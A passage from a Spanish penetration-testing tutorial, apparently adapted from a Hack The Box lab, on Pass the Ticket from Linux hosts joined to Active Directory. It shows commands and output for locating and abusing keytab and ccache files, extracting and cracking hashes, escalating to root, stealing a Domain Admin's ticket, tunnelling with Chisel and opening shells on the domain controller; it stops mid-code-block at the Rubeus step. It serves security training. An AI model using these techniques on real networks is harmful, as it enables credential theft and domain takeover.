
# Pass the Ticket (PtT) - Linux

Aunque no es común, las máquinas con Linux pueden conectarse a Active Directory para proporcionar administración de identidades centralizada e integrarse con los sistemas de la organización, brindando a los usuarios la capacidad de tener una identidad única para autenticarse en computadoras con Linux y Windows.

Una máquina Linux conectada a Active Directory comúnmente usa Kerberos como autenticación. Supongamos que este es el caso y logramos comprometer una máquina Linux conectada a Active Directory. En ese caso, podríamos intentar encontrar tickets de Kerberos para hacerse pasar por otros usuarios y obtener más acceso a la red.

Un sistema Linux se puede configurar de varias maneras para almacenar tickets de Kerberos. Discutiremos algunas opciones de almacenamiento diferentes en esta sección.

{% hint style="info" %}
**Nota**: Una máquina Linux no conectada a Active Directory podría usar tickets de Kerberos en scripts o para autenticarse en la red. No es necesario estar unido al dominio para utilizar tickets Kerberos desde una máquina Linux.
{% endhint %}

***

## <mark style="color:purple;">Kerberos en Linux</mark>

Windows y Linux utilizan el mismo proceso para solicitar un Ticket de concesión de tickets (TGT) y un Ticket de servicio (TGS). Sin embargo, la forma en que almacenan la información del ticket puede variar según la distribución e implementación de Linux.

En la mayoría de los casos, las máquinas Linux almacenan tickets de Kerberos como [archivos ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) en el directorio `/tmp`. De forma predeterminada, la ubicación del ticket de Kerberos se almacena en la variable de entorno `KRB5CCNAME`. Esta variable puede identificar si se están utilizando tickets de Kerberos o si se cambia la ubicación predeterminada para almacenar tickets de Kerberos. Estos [archivos ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) están protegidos por permisos de lectura y escritura, pero un usuario con privilegios elevados o privilegios de root podría obtener acceso fácilmente a estos tickets.

Otro uso cotidiano de Kerberos en Linux es con archivos [keytab](https://kb.iu.edu/d/aumh) . Una [tabla de claves](https://kb.iu.edu/d/aumh) es un archivo que contiene pares de principales de Kerberos y claves cifradas (que se derivan de la contraseña de Kerberos). Puede usar un archivo de tabla de claves para autenticarse en varios sistemas remotos usando Kerberos sin ingresar una contraseña. Sin embargo, cuando cambia su contraseña, debe volver a crear todos sus archivos de tabla de claves.

[Los archivos Keytab](https://kb.iu.edu/d/aumh) comúnmente permiten que los scripts se autentiquen automáticamente usando Kerberos sin requerir interacción humana o acceso a una contraseña almacenada en un archivo de texto sin formato. Por ejemplo, una secuencia de comandos puede utilizar un archivo de tabla de claves para acceder a los archivos almacenados en la carpeta compartida de Windows.

Nota: Cualquier computadora que tenga instalado un cliente Kerberos puede crear archivos de tabla de claves. Los archivos Keytab se pueden crear en una computadora y copiar para su uso en otras computadoras porque no están restringidos a los sistemas en los que se crearon inicialmente.

***

## <mark style="color:purple;">Escenario</mark>

Para practicar y entender cómo podemos abusar de Kerberos desde un sistema Linux, tenemos una máquina ( `LINUX01`) conectada al Controlador de Dominio. Solo se puede acceder a esta máquina a través de `MS01`. Para acceder a esta máquina a través de SSH, podemos conectarnos `MS01`a través de RDP y, desde allí, conectarnos a la máquina Linux usando SSH desde la línea de comandos de Windows. Otra opción es utilizar un Port Forwarding.

**Autenticación de Linux desde la máquina MS01**

![texto](https://academy.hackthebox.com/storage/modules/147/linux-auth-from-ms01.jpg)

Como alternativa, creamos un redireccionamiento de puertos para simplificar la interacción con `LINUX01`. Al conectarnos al puerto TCP/2222 en `MS01`, obtendremos acceso al puerto TCP/22 en `LINUX01`.

Supongamos que estamos en una nueva evaluación y la empresa nos da acceso a `LINUX01`y el usuario `david@inlanefreight.htb` y contraseña `Password2`.

**Autenticación en Linux con Port Forwarding**

```shell-session
afsh4ck@kali$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222

david@inlanefreight.htb@10.129.204.23's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 11 Oct 2022 09:30:58 AM UTC

  System load:  0.09               Processes:               227
  Usage of /:   38.1% of 13.70GB   Users logged in:         2
  Memory usage: 32%                IPv4 address for ens160: 172.16.1.15
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

12 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

New release '22.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Tue Oct 11 09:30:46 2022 from 172.16.1.5
david@inlanefreight.htb@linux01:~$ 
```

***

## <mark style="color:purple;">Identificando Linux y su integración con Active Directory</mark>

Podemos identificar si la máquina Linux está unida a un dominio usando [kingdom](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) , una herramienta utilizada para administrar la inscripción del sistema en un dominio y establecer qué usuarios o grupos del dominio pueden acceder a los recursos del sistema local.

### **realm - Comprobar si la máquina Linux está unida al dominio**

```shell-session
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

El resultado del comando indica que la máquina está configurada como miembro de Kerberos. También nos da información sobre el nombre del dominio (inlanefreight.htb) y qué usuarios y grupos pueden iniciar sesión, que en este caso son los usuarios David y Julio y el grupo Linux Admins.

En caso de que [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) no esté disponible, también podemos buscar otras herramientas utilizadas para integrar Linux con Active Directory como [sssd](https://sssd.io/) o [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) . Buscar los servicios que se ejecutan en la máquina es otra forma de identificar si está unida al dominio. Podemos leer esta [publicación de blog](https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) para más detalles. Busquemos esos servicios para confirmar si la máquina está unida al dominio.

### **PS - Comprueba si la máquina Linux está unida al dominio**

```shell-session
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root        2142    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
```

***

## <mark style="color:purple;">Encontrar tickets de Kerberos en Linux</mark>

Como atacante, siempre buscamos credenciales. En máquinas unidas a un dominio Linux, queremos encontrar tickets de Kerberos para obtener más acceso. Los tickets de Kerberos se pueden encontrar en diferentes lugares según la implementación de Linux o si el administrador cambia la configuración predeterminada. Exploremos algunas formas comunes de encontrar tickets de Kerberos.

***

### <mark style="color:purple;">Encontrar archivos keytab</mark>

Un método sencillo es utilizar `find` para buscar archivos cuyo nombre contenga la palabra `keytab`. Cuando un administrador normalmente crea un ticket de Kerberos para usarlo con un script, establece la extensión en `.keytab`. Aunque no es obligatorio, es una forma en la que los administradores suelen referirse a un archivo de tabla de claves.

**Uso de find para buscar archivos con el nombre Keytab**

```shell-session
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

<SNIP>

   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```

{% hint style="info" %}
**Nota**: Para utilizar un archivo `keytab`, debemos tener privilegios de lectura y escritura (rw) en el archivo.
{% endhint %}

Otra forma de buscar archivos `keytab` es mediante scripts automatizados configurados mediante un cronjob o cualquier otro servicio de Linux. Si un administrador necesita ejecutar un script para interactuar con un servicio de Windows que usa Kerberos, y si el archivo de tabla de claves no tiene la extensión `.keytab`, podemos encontrar el nombre de archivo apropiado dentro del script. Veamos este ejemplo:

#### **Identificar archivos Keytab en Cronjobs**

```shell-session
carlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
<SNIP>
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

En el script anterior, notamos el uso de [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) , lo que significa que Kerberos está en uso. [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) permite la interacción con Kerberos, y su función es solicitar el TGT del usuario y almacenar este ticket en el caché (archivo ccache). Podemos usar `kinit` para importar `keytab` a nuestra sesión y actuar como usuario.

En este ejemplo, encontramos un script que importa un ticket de Kerberos ( `svc_workstations.kt`) para el usuario `svc_workstations@INLANEFREIGHT.HTB` antes de intentar conectarse a una carpeta compartida. Más adelante discutiremos cómo usar esos tickets y hacerse pasar por usuarios.

{% hint style="info" %}
**Nota**: Como comentamos en la sección Pass the Ticket desde Windows, una cuenta de pc necesita un ticket para interactuar con el entorno de Active Directory. De manera similar, una máquina unida a un dominio Linux necesita un ticket. El ticket se representa como un archivo KeyTab ubicado de forma predeterminada en `/etc/krb5.keytab` y solo puede ser leído por el usuario root. Si logramos acceder a este ticket, podemos suplantar la cuenta de computadora LINUX01$.INLANEFREIGHT.HTB
{% endhint %}

***

### <mark style="color:purple;">Encontrar archivos ccache</mark>

Una caché de credenciales o un archivo [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) contiene las credenciales de Kerberos mientras siguen siendo válidas y, en general, mientras dura la sesión del usuario. Una vez que un usuario se autentica en el dominio, se crea un archivo ccache que almacena la información del ticket. La ruta a este archivo se coloca en la `KRB5CCNAME`variable de entorno. Esta variable la utilizan herramientas que admiten la autenticación Kerberos para encontrar los datos de Kerberos. Busquemos las variables de entorno e identifiquemos la ubicación de nuestra caché de credenciales de Kerberos:

**Revisión de variables de entorno para archivos ccache.**

```shell-session
david@inlanefreight.htb@linux01:~$ env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

Como se mencionó anteriormente, los archivos `ccache` se encuentran, de forma predeterminada, en `/tmp`. Podemos buscar usuarios que hayan iniciado sesión en la computadora y, si obtenemos acceso como root o usuario privilegiado, podremos hacerse pasar por un usuario usando su archivo `ccache` mientras aún sea válido.

**Buscando archivos ccache en /tmp**

```shell-session
david@inlanefreight.htb@linux01:~$ ls -la /tmp

total 68
drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
-rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
```

***

### <mark style="color:purple;">Abusar de archivos KeyTab</mark>

Como atacantes, podemos tener varios usos para un archivo keytab. Lo primero que podemos hacer es suplantar a un usuario usando `kinit`. Para utilizar un archivo keytab, necesitamos saber para qué usuario fue creado. `klist` es otra aplicación utilizada para interactuar con Kerberos en Linux. Esta aplicación lee información de un archivo `keytab`. Veámoslo con el siguiente comando:

**Listado de información del archivo KeyTab**

```shell-session
david@inlanefreight.htb@linux01:~$ klist -k -t 

/opt/specialfiles/carlos.keytab 
Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

El ticket corresponde al usuario Carlos. Ahora podemos suplantar al usuario con `kinit`. Confirmemos con qué ticket estamos usando `klist` y luego importemos el ticket de Carlos a nuestra sesión con `kinit`.

{% hint style="info" %}
**Nota**: kinit distingue entre mayúsculas y minúsculas, así que asegúrese de utilizar el nombre del principal como se muestra en klist. En este caso, el nombre de usuario está en minúsculas y el nombre de dominio está en mayúsculas.
{% endhint %}

**Suplantar a un usuario con una KeyTab**

```shell-session
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```

Podemos intentar acceder a la carpeta compartida `\\dc01\carlos` para confirmar nuestro acceso.

**Conectándonos a SMB Share como Carlos**

```shell-session
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls

  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

                7706623 blocks of size 4096. 4452852 blocks available
```

{% hint style="info" %}
**Nota**: Para conservar el ticket de la sesión actual, antes de importar la tabla de claves, guarde una copia del archivo ccache presente en la variable de entorno `KRB5CCNAME`.
{% endhint %}

#### Extracción de Hashes de KeyTab

El segundo método que usaremos para abusar de Kerberos en Linux es extraer los secretos de un archivo keytab. Pudimos hacernos pasar por Carlos usando los tickets de la cuenta para leer una carpeta compartida en el dominio, pero si queremos obtener acceso a su cuenta en la máquina Linux, necesitaremos su contraseña.

Podemos intentar descifrar la contraseña de la cuenta extrayendo los hashes del archivo keytab. Usemos [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) , una herramienta para extraer información valiosa de archivos .keytab de tipo 502, que pueden usarse para autenticar cajas de Linux en Kerberos. El script extraerá información como el dominio, la entidad de servicio, el tipo de cifrado y los hashes.

**Extracción de hashes de Keytab con KeyTabExtract**

```shell-session
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

* Con el hash NTLM, podemos realizar un ataque Pass the Hash.&#x20;
* Con el hash AES256 o AES128 podemos falsificar nuestros tickets usando Rubeus o intentar descifrar los hashes para obtener la contraseña en plano.

{% hint style="info" %}
**Nota**: Un archivo de tabla de claves puede contener diferentes tipos de hashes y se puede combinar para contener varias credenciales incluso de diferentes usuarios.
{% endhint %}

El hash más sencillo de descifrar es el hash NTLM. Podemos utilizar herramientas como [Hashcat](https://hashcat.net/) o [John the Ripper](https://www.openwall.com/john/) para descifrarlo. Sin embargo, una forma rápida de descifrar contraseñas es mediante repositorios en línea como <https://crackstation.net/> , que contiene miles de millones de contraseñas.

![texto](https://academy.hackthebox.com/storage/modules/147/crackstation.jpg)

Como podemos ver en la imagen, la contraseña del usuario Carlos es `Password5`. Ahora podemos iniciar sesión como Carlos.

**Inicia sesión como Carlos**

```shell-session
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb

Password: 
carlos@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647402606_ZX6KFA
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 11:01:13
```

#### Obtener más hashes

Carlos tiene un cronjob que utiliza un archivo KeyTab llamado `svc_workstations.kt`. Podemos repetir el proceso, descifrar la contraseña e iniciar sesión como `svc_workstations`.

***

## <mark style="color:purple;">Abusar del ccache de Keytab</mark>

Para abusar de un archivo `ccache`, todo lo que necesitamos son privilegios de lectura sobre el archivo. Estos archivos, ubicados en `/tmp`, sólo pueden ser leídos por el usuario que los creó, pero si conseguimos acceso root, podremos utilizarlos.

Una vez que iniciamos sesión con las credenciales del usuario `svc_workstations`, podemos usar `sudo -l` y confirmar que el usuario puede ejecutar cualquier comando como root. Podemos usar el comando `sudo su` para cambiar el usuario a root.

### **Escalada de privilegios a root**

```shell-session
afsh4ck@kali$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
                  
svc_workstations@inlanefreight.htb@10.129.204.23's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)          
...SNIP...

svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
[sudo] password for svc_workstations@inlanefreight.htb: 
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
svc_workstations@inlanefreight.htb@linux01:~$ sudo su
root@linux01:/home/svc_workstations@inlanefreight.htb# whoami
root
```

Como root, necesitamos identificar qué tickets están presentes en la máquina, a quién pertenecen y su tiempo de vencimiento.

### **Buscando archivos ccache**

```shell-session
root@linux01:~# ls -la /tmp

total 76
drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Oct  7 11:35 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
```

Hay un usuario ( `julio@inlanefreight.htb` ) al que aún no hemos obtenido acceso. Podemos confirmar los grupos a los que pertenece mediante `id`.

### **Identificar la pertenencia a un grupo con el comando id**

```shell-session
root@linux01:~# id julio@inlanefreight.htb

uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
```

Julio es miembro del grupo `Domain Admins`. Podemos intentar suplantar al usuario y obtener acceso al host `DC01` del controlador de dominio.

Para usar un archivo ccache, podemos copiar el archivo ccache y asignar la ruta del archivo a la variable `KRB5CCNAME`.

### **Importando el archivo ccache a nuestra sesión actual**

```shell-session
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
  john                                D        0  Mon Jul 18 13:19:50 2022
  julio                               D        0  Mon Jul 18 13:54:02 2022
  pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2022
  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
  tools                               D        0  Thu Sep 22 18:19:04 2022
  Users                              DR        0  Thu Oct  6 11:46:05 2022
  Windows                             D        0  Wed Oct  5 13:20:00 2022

                7706623 blocks of size 4096. 4447612 blocks available
```

{% hint style="info" %}
**Nota**: klist muestra la información del ticket. Debemos considerar los valores "inicio válido" y "caduca". Si la fecha de vencimiento ha pasado, el ticket no funcionará. Los archivos `ccache` son temporales. Pueden cambiar o caducar si el usuario ya no los utiliza o durante las operaciones de inicio y cierre de sesión.
{% endhint %}

***

## <mark style="color:purple;">Uso de herramientas de ataque de Linux con Kerberos</mark>

La mayoría de las herramientas de ataque de Linux que interactúan con Windows y Active Directory admiten la autenticación Kerberos. Si los usamos desde una máquina unida a un dominio, debemos asegurarnos de que nuestra variable `KRB5CCNAME` de entorno esté configurada en el archivo ccache que queremos usar. En caso de que estemos atacando desde una máquina que no es miembro del dominio, por ejemplo, nuestro host de ataque, debemos asegurarnos de que nuestra máquina pueda comunicarse con el KDC o el controlador de dominio y que la resolución de nombres de dominio esté funcionando.

En este escenario, nuestro host de ataque no tiene una conexión con el servidor `KDC/Domain Controller`y no podemos usar el controlador de dominio para la resolución de nombres. Para usar Kerberos, necesitamos enviar nuestro tráfico mediante proxy `MS01`con una herramienta como [Chisel](https://github.com/jpillora/chisel) y [Proxychains](https://github.com/haad/proxychains) y editar el `/etc/hosts`archivo para codificar las direcciones IP del dominio y las máquinas que queremos atacar.

### **Archivo de host modificado (etc/hosts)**

```shell-session
afsh4ck@kali$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

Necesitamos modificar nuestro archivo de configuración de proxychains para usar socks5 y el puerto 1080.

### **Archivo de configuración de Proxychains**

```shell-session
afsh4ck@kali$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

Debemos descargar y ejecutar [chisel](https://github.com/jpillora/chisel) en nuestro host de ataque.

### **Descarga Chisel en nuestro Host de Ataque**

```shell-session
afsh4ck@kali$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
afsh4ck@kali$ gzip -d chisel_1.7.7_linux_amd64.gz
afsh4ck@kali$ mv chisel_* chisel && chmod +x ./chisel
afsh4ck@kali$ sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

### **Conexión con MS01 con xfreerdp**

```shell-session
afsh4ck@kali$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

### **Ejecutar Chisel desde MS01**

```powershell
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

{% hint style="info" %}
Nota: La IP del cliente es la IP del host de ataque.
{% endhint %}

Finalmente, necesitamos transferir el archivo ccache de Julio a `LINUX01` y crear la variable de entorno `KRB5CCNAME` con el valor correspondiente a la ruta del archivo ccache.

**Configuración de la variable de entorno KRB5CCNAME**

```shell-session
afsh4ck@kali$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

{% hint style="info" %}
Nota: Si no estás familiarizado con las operaciones de transferencia de archivos, consulta el módulo [File Transfers](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/file-transfers.md) .
{% endhint %}

### <mark style="color:purple;">Impacket</mark>

Para usar el ticket Kerberos, debemos especificar el nombre de nuestra máquina de destino (no la dirección IP) y usar la opción `-k`. Si nos solicita una contraseña, también podemos incluir la opción `-no-pass`.

**Usando Impacket con proxychains y autenticación Kerberos**

```shell-session
afsh4ck@kali$ proxychains impacket-wmiexec dc01 -k

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
inlanefreight\julio
```

{% hint style="info" %}
**Nota**: Si está utilizando Impacket desde una máquina Linux conectada al dominio, tenga en cuenta que algunas implementaciones de Active Directory de Linux usan el prefijo `FILE:` en la variable `KRB5CCNAME`. Si este es el caso, necesitamos modificar la variable solo para incluir la ruta al archivo ccache.
{% endhint %}

### <mark style="color:purple;">Evil-Winrm</mark>

Para utilizar [evil-winrm](https://github.com/Hackplayers/evil-winrm) con Kerberos, necesitamos instalar el paquete Kerberos utilizado para la autenticación de red. Para algunos Linux como los basados ​​en Debian (Parrot, Kali, etc.), se llama `krb5-user`. Durante la instalación, recibiremos un mensaje para el ámbito de Kerberos. Utilice el nombre de dominio: `INLANEFREIGHT.HTB` y el KDC es el `DC01`.

**Instalación del paquete de autenticación Kerberos**

```shell-session
afsh4ck@kali$ sudo apt-get install krb5-user -y

Reading package lists... Done                                                                                                  
Building dependency tree... Done    
Reading state information... Done

<SNIP>
```

**Kerberos versión 5 predeterminado:**

![texto](https://academy.hackthebox.com/storage/modules/147/kerberos-realm.jpg)

Los servidores Kerberos pueden estar vacíos.

**Servidor administrativo para su Kerberos:**

![texto](https://academy.hackthebox.com/storage/modules/147/kerberos-server-dc01.jpg)

En caso de que el paquete `krb5-user` ya esté instalado, debemos cambiar el archivo de configuración `/etc/krb5.conf` para incluir los siguientes valores:

**Archivo de configuración Kerberos para INLANEFREIGHT.HTB**

```shell-session
afsh4ck@kali$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```

Ahora podemos usar evil-winrm.

**Usando Evil-WinRM con Kerberos**

```shell-session
afsh4ck@kali$ proxychains evil-winrm -i dc01 -r inlanefreight.htb

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14

Evil-WinRM shell v3.3

Warning: Remote path completions are disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
inlanefreight\julio
DC01
```

***

## <mark style="color:purple;">Conversión de Tickets</mark>

Si queremos usar un archivo `ccache` en Windows o un archivo `kirbi` en una máquina Linux, podemos usar [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) para convertirlos. Para usarlo, especificamos el archivo que queremos convertir y el nombre del archivo de salida. Convirtamos el archivo ccache de Julio a kirbi.

### **Impacket Ticket Converter**

```shell-session
afsh4ck@kali$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
```

Podemos hacer la operación inversa seleccionando primero un archivo `.kirbi file`. Usemos el archivo `.kirbi` en Windows.

**Importación de ticket convertido a sesión de Windows con Rubeus**

```powershell
